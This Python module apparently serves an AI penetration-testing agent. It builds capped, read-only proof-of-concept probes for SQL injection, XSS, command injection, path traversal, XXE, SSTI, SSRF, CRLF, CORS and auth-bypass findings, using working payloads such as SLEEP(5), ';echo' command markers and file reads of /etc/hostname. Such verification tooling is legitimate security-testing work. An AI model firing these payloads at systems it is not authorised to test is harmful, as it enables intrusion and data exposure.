"""Auto-PoC template generator for the Mandatory PoC Verification Protocol.

generate_poc(finding_type, asset, param, extra) returns a READY-TO-RUN,
NON-DESTRUCTIVE PoC (curl one-liner + python script + expected evidence)
for common vulnerability classes. The agent runs the script via its
terminal tool, logs the OUTPUT as the finding's `evidence`, and only then
may the finding carry verification_status=CONFIRMED_POC with
CRITICAL/HIGH severity.

Safety contract baked into every template:
- read-only probes only (no writes, deletes, drops, shutdowns, DoS)
- time-delay proofs capped at 5 seconds
- no payload wider than a normal request; no brute-force loops
- every template states exactly what output counts as proof

Classes: sqli (error/boolean), sqli_time, xss_reflect, xss_stored_probe,
ssrf, cmdi, lfi, open_redirect, ssti, xxe, idor, auth_bypass, cors,
header_injection, cors_misconfig? (kept list explicit below).
"""

import json

# finding_type -> template dict
# Each template: title, safety, payload, curl, python, proof, cwe

_P = {
    "sqli": {
        "title": "SQL injection (error / boolean-based, non-destructive)",
        "cwe": "CWE-89",
        "safety": "Single request, read-only; no data modified or dumped.",
        "payload": "' OR '1'='1'-- -",
        "proof": ("response body contains a SQL engine error message "
                  "(e.g. 'You have an error in your SQL syntax ... MySQL', "
                  "'ERROR: syntax error at or near', 'unclosed quotation "
                  "mark'), OR the parameterised comparison shows a state "
                  "change ('1'='1' true vs false response bodies differ)"),
        "curl": "curl -sk -G \"{URL}\" --data-urlencode \"{PARAM}=' OR '1'='1'-- -\" | grep -iE \"sql syntax|unclosed quotation|syntax error at or near|SQLSTATE\"",
    },
    "sqli_time": {
        "title": "SQL injection (time-based blind, 5s ceiling)",
        "cwe": "CWE-89",
        "safety": ("One request with a 5-second engine delay "
                   "(SLEEP(5) / pg_sleep(5)); read-only, no stacking of "
                   "long delays."),
        "payload": "' AND SLEEP(5)-- -",
        "proof": ("response time is >= 5s versus a ~instant baseline "
                  "(run the same request without the payload to compare "
                  "baseline timing)"),
        "curl": "curl -sk -o /dev/null -w \"%{time_total}\\n\" -G \"{URL}\" --data-urlencode \"{PARAM}=' AND SLEEP(5)-- -\"",
    },
    "xss_reflect": {
        "title": "Reflected XSS (marker probe, no script execution against third parties)",
        "cwe": "CWE-79",
        "safety": ("Inert marker payload - it only proves reflection; "
                   "do not send the URL to any real user (no stored "
                   "delivery, no external callback)."),
        "payload": "\"><svg/onload=poc_x55x4fx43>uniquemarker7f3a",
        "proof": ("response body echoes 'uniquemarker7f3a' inside the HTML "
                  "in an unencoded context (check that <svg or \\\"> were "
                  "NOT HTML-entity-encoded)"),
        "curl": "curl -sk -G \"{URL}\" --data-urlencode \"{PARAM}=\\\"><svg/onload=poc_x55x4fx43>uniquemarker7f3a\" | grep -n \"uniquemarker7f3a\"",
    },
    "ssrf": {
        "title": "SSRF (internal loopback probe, read-only)",
        "cwe": "CWE-918",
        "safety": ("Only probes the target's own loopback interface; no "
                   "external collaborator, no internal service scanning "
                   "beyond one self-reference request."),
        "payload": "http://127.0.0.1:80/",
        "proof": ("response differs from a request with a harmless external "
                  "URL, returns an internal error mentioning the loopback, "
                  "or reflects content from 127.0.0.1 - capture the exact "
                  "response body/snippet"),
        "curl": "curl -sk -G \"{URL}\" --data-urlencode \"{PARAM}=http://127.0.0.1:80/\" -D - -o /dev/null | head -20",
    },
    "cmdi": {
        "title": "Command injection (inert echo marker)",
        "cwe": "CWE-78",
        "safety": ("Appends only an echo of a fixed marker - no destructive "
                   "commands, no downloads, no reversals."),
        "payload": ";echo POCMARK-q7w8e9",
        "proof": ("response body contains 'POCMARK-q7w8e9' where normal "
                  "parameter values do not produce it"),
        "curl": "curl -sk -G \"{URL}\" --data-urlencode \"{PARAM}=;echo POCMARK-q7w8e9\" | grep -n \"POCMARK-q7w8e9\"",
    },
    "lfi": {
        "title": "Local file inclusion / path traversal (read of an innocuous file)",
        "cwe": "CWE-22",
        "safety": "Read-only traversal to a harmless, world-readable file.",
        "payload": "../../../../../../../../etc/hostname",
        "proof": ("response body contains the target's hostname value or a "
                  "file-open error confirming traversal (e.g. 'failed to "
                  "open stream') - /etc/passwd line format "
                  "'root:x:0:0:' also accepted as proof"),
        "curl": "curl -sk -G \"{URL}\" --data-urlencode \"{PARAM}=../../../../../../../../etc/hostname\" | head -5",
    },
    "open_redirect": {
        "title": "Open redirect",
        "cwe": "CWE-601",
        "safety": "Single redirect observation to a benign example domain.",
        "payload": "https://example.com/poc-redirect",
        "proof": ("HTTP response is 30x with a Location header pointing to "
                  "example.com (capture the exact Location header), or the "
                  "client-side JS sets location to it"),
        "curl": "curl -sk -o /dev/null -w \"%{http_code} %{redirect_url}\\n\" -G \"{URL}\" --data-urlencode \"{PARAM}=https://example.com/poc-redirect\"",
    },
    "ssti": {
        "title": "Server-side template injection (arithmetic marker)",
        "cwe": "CWE-1336",
        "safety": "Arithmetic-only expression; no object access, no code exec.",
        "payload": "{{7*7}}",
        "proof": ("response body contains '49' where the literal '{{7*7}}' "
                  "was sent (confirm '49' is not echoed for benign input)"),
        "curl": "curl -sk -G \"{URL}\" --data-urlencode \"{PARAM}={{7*7}}\" | grep -n \"49\"",
    },
    "xxe": {
        "title": "XML external entity injection (loopback file read, read-only)",
        "cwe": "CWE-611",
        "safety": ("Entity resolves a single innocuous local file on the "
                   "target itself; no OOB collaborator."),
        "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>&x;</r>",
        "proof": ("response body embeds the contents of /etc/hostname or a "
                  "parser error confirming external entity resolution"),
        "curl": "curl -sk \"{URL}\" -H \"Content-Type: application/xml\" --data-binary \"<?xml version='1.0'?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/hostname'>]><r>&x;</r>\" | head -10",
    },
    "idor": {
        "title": "IDOR / missing object-level authorization (two-account comparison)",
        "cwe": "CWE-639",
        "safety": ("Read-only GET of an object id owned by another "
                   "principal of YOUR OWN test accounts; no real-customer "
                   "data enumerated."),
        "payload": "object_id_of_other_test_account",
        "proof": ("Request A (low-priv test account) to "
                  "/resource/{other-test-account-id} returns 200 with the "
                  "other account's own test data instead of 403 - log both "
                  "requests/responses as evidence"),
        "curl": "curl -sk \"{URL}/{OTHER_TEST_ACCOUNT_ID}\" -H \"Authorization: Bearer <LOW_PRIV_TEST_TOKEN>\" -D - | head -15",
    },
    "auth_bypass": {
        "title": "Authentication / authorization bypass (header or path trick)",
        "cwe": "CWE-288",
        "safety": "Read-only request to one protected endpoint; nothing modified.",
        "payload": "X-Original-URL: /admin",
        "proof": ("the protected endpoint returns 200/admin content without "
                  "valid credentials when the header/path trick is applied, "
                  "vs 401/403 without it - log both responses"),
        "curl": "curl -sk \"{BASE_URL}/unprotected\" -H \"X-Original-URL: /admin\" -D - | head -15",
    },
    "cors": {
        "title": "CORS misconfiguration (arbitrary origin reflection)",
        "cwe": "CWE-942",
        "safety": "One request with a benign example origin.",
        "payload": "Origin: https://attacker.example.com",
        "proof": ("response carries 'Access-Control-Allow-Origin: "
                  "https://attacker.example.com' (plus Allow-Credentials: "
                  "true if claimed) - log the response headers"),
        "curl": "curl -sk \"{URL}\" -H \"Origin: https://attacker.example.com\" -D - -o /dev/null | grep -i \"access-control\"",
    },
    "header_injection": {
        "title": "HTTP response splitting / header injection (CRLF marker)",
        "cwe": "CWE-113",
        "safety": "Marker-only header; no cache poisoning, no session writes.",
        "payload": "poc%0d%0aX-POC-Marker: 7q6w5e",
        "proof": ("response contains an injected 'X-POC-Marker: 7q6w5e' "
                  "response header"),
        "curl": "curl -sk -G \"{URL}\" --data-urlencode \"{PARAM}=poc%0d%0aX-POC-Marker: 7q6w5e\" -D - -o /dev/null | grep -i \"x-poc-marker\"",
    },
}

ALIASES = {
    "sql_injection": "sqli", "sql": "sqli", "sqli_error": "sqli",
    "sqli_time": "sqli_time", "sqli_blind": "sqli_time",
    "xss": "xss_reflect", "reflected_xss": "xss_reflect",
    "ssrf": "ssrf", "rce": "cmdi", "command_injection": "cmdi",
    "cmd_injection": "cmdi", "lfi": "lfi", "path_traversal": "lfi",
    "directory_traversal": "lfi", "open_redirect": "open_redirect",
    "redirect": "open_redirect", "ssti": "ssti",
    "template_injection": "ssti", "xxe": "xxe",
    "idor": "idor", "access_control": "idor", "bola": "idor",
    "auth_bypass": "auth_bypass", "broken_auth": "auth_bypass",
    "cors": "cors", "cors_misconfig": "cors",
    "crlf": "header_injection", "header_injection": "header_injection",
    "response_splitting": "header_injection",
}


def poc_classes():
    """List the available non-destructive PoC template classes."""
    lines = ["Available non-destructive PoC templates:"]
    for key, t in sorted(_P.items()):
        lines.append("  %-16s %s (%s)" % (key, t["title"], t["cwe"]))
    return "\n".join(lines)


_PY_TEMPLATE = '''#!/usr/bin/env python3
"""Auto-generated NON-DESTRUCTIVE PoC: %(title)s
Target: %(url)s  Param: %(param)s
Safety: %(safety)s
Run this, then paste its FULL output into add_finding(evidence=...).
"""
import sys
import time

import requests

URL = %(url)r
PARAM = %(param)r
PAYLOAD = %(payload)r
MARKER_RESPONSE_TIME = 5.0

def main():
    s = requests.Session()
    s.headers["User-Agent"] = "PoC-Verify/1.0"
    # baseline (benign) request for comparison
    r0 = s.get(URL, params={PARAM: "poc_baseline"}, timeout=15,
               allow_redirects=False)
    print("BASELINE status=%%s time=%%.3fs len=%%d"
          %% (r0.status_code, r0.elapsed.total_seconds(), len(r0.text)))
    t0 = time.time()
    r = s.get(URL, params={PARAM: PAYLOAD}, timeout=20,
              allow_redirects=False)
    dt = r.elapsed.total_seconds()
    print("POC      status=%%s time=%%.3fs len=%%d"
          %% (r.status_code, dt, len(r.text)))
    body = r.text
    print("--- response body (first 2000 chars) ---")
    print(body[:2000])
    print("--- end body ---")
    print("EXPECTED PROOF: %(proof)s")
    if %(delay)r and dt >= MARKER_RESPONSE_TIME:
        print("TIMING DELTA CONFIRMED: %%.3fs vs baseline" %% dt)
    else:
        print("Inspect the body above for the expected proof markers.")

if __name__ == "__main__":
    main()
'''


def generate_poc(finding_type="", asset="", param="", extra=""):
    """Build a ready-to-run non-destructive PoC for a finding class.

    Returns a markdown block with: safety contract, payload, curl
    one-liner, python script, and the exact expected-proof description.
    """
    ft = str(finding_type or "").strip().lower().replace("-", "_")
    ft = ALIASES.get(ft, ft)
    if ft in ("classes", "list", "help", ""):
        return poc_classes()
    t = _P.get(ft)
    if t is None:
        return ("gen_poc: unknown finding_type '%s'. Available: %s "
                "(gen_poc(finding_type='classes') for details)"
                % (finding_type, ", ".join(sorted(_P))))
    url = str(asset or "").strip()
    if not url:
        return ("gen_poc: 'asset' required - the affected URL/endpoint, "
                "e.g. https://app.example.com/search")
    param = str(param or "q").strip()
    curl = t["curl"].replace("{URL}", url).replace("{PARAM}", param)
    delay = ft == "sqli_time"
    script = _PY_TEMPLATE % {
        "title": t["title"].replace("%", "%%"),
        "url": url, "param": param,
        "payload": t["payload"].replace("%", "%%"),
        "safety": t["safety"].replace("%", "%%"),
        "proof": t["proof"].replace("%", "%%"),
        "delay": delay,
    }
    extra_note = ""
    if str(extra or "").strip():
        extra_note = ("\n**Operator notes:** %s\n"
                      % str(extra).strip()[:500])
    return (
        "NON-DESTRUCTIVE PoC - %s (%s)\n"
        "================================================================\n"
        "Target: %s | Param: %s\n"
        "Safety contract: %s\n"
        "%s\n"
        "**Payload:** `%s`\n\n"
        "**Expected proof (this is what you log as evidence):** %s\n\n"
        "**Quick check (curl):**\n```bash\n%s\n```\n\n"
        "**Full script (save as poc_%s.py, run it, log the FULL output as "
        "evidence):**\n```python\n%s```\n"
        "After the run: add_finding(..., verification_status="
        "'CONFIRMED_POC', evidence='<full PoC output>') - CRITICAL/HIGH "
        "severity is only accepted with that logged evidence.\n"
        % (t["title"], t["cwe"], url, param, t["safety"], extra_note,
           t["payload"], t["proof"], curl, ft, script))
